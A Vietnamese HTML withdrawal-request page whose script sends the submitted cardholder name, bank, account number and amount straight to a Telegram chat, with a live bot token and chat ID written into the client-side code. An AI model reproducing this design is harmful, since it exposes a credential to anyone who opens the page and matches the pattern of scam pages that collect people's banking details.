<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yêu Cầu Rút Tiền</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Yêu Cầu Rút Tiền</h2>
    <form id="withdrawalForm">
        <div class="form-group">
            <label for="fullname">Họ và tên chủ thẻ:</label>
            <input type="text" id="fullname" placeholder="NGUYEN VAN A" required>
        </div>

        <div class="form-group">
            <label for="bank">Ngân hàng:</label>
            <select id="bank" required>
                <option value="">-- Chọn ngân hàng --</option>
                <option value="Vietcombank">Vietcombank</option>
                <option value="Techcombank">Techcombank</option>
                <option value="MB Bank">MB Bank</option>
                <option value="Vietinbank">Vietinbank</option>
                <option value="Momo">Ví MoMo</option>
            </select>
        </div>

        <div class="form-group">
            <label for="account_number">Số tài khoản / Số điện thoại:</label>
            <input type="text" id="account_number" placeholder="Nhập số tài khoản" required>
        </div>

        <div class="form-group">
            <label for="amount">Số tiền muốn rút (VND):</label>
            <input type="number" id="amount" min="10000" placeholder="Ví dụ: 100000" required>
        </div>

        <button type="submit" id="btnSubmit">Xác Nhận Rút Tiền</button>
    </form>
</div>

<script>
document.getElementById('withdrawalForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const btn = document.getElementById('btnSubmit');
    btn.innerText = "Đang xử lý...";
    btn.disabled = true;

    // Thông tin Telegram cấu hình sẵn
    const botToken = "8664079130:AAGCDkMhNyjnfNM9wceQ_Pc301bIMYetvdA";
    const chatId = "6686303067";

    // Lấy dữ liệu form
    const fullname = document.getElementById('fullname').value.trim();
    const bank = document.getElementById('bank').value;
    const accountNumber = document.getElementById('account_number').value.trim();
    const amount = document.getElementById('amount').value;
    
    // Định dạng tiền tệ
    const formattedAmount = Number(amount).toLocaleString('vi-VN') + " VND";
    const time = new Date().toLocaleString('vi-VN');

    // Soạn tin nhắn gửi về Telegram
    let message = `🚨 *CÓ YÊU CẦU RÚT TIỀN MỚI* 🚨\n\n`;
    message += `👤 *Chủ thẻ:* ${fullname}\n`;
    message += `🏦 *Ngân hàng:* ${bank}\n`;
    message += `💳 *Số tài khoản:* \`${accountNumber}\`\n`; // Click vào tự động copy
    message += `💵 *Số tiền:* *${formattedAmount}*\n`;
    message += `🕒 *Thời gian:* ${time}\n\n`;
    message += `👉 _Vui lòng kiểm tra và thực hiện giao dịch!_`;

    // Gọi API Telegram trực tiếp bằng Fetch
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Gửi yêu cầu rút tiền thành công! Vui lòng chờ hệ thống xử lý.');
            document.getElementById('withdrawalForm').reset();
        } else {
            alert('Lỗi: Không thể gửi yêu cầu. Vui lòng thử lại.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Có lỗi mạng xảy ra, vui lòng thử lại sau.');
    })
    .finally(() => {
        btn.innerText = "Xác Nhận Rút Tiền";
        btn.disabled = false;
    });
});
</script>

</body>
</html>
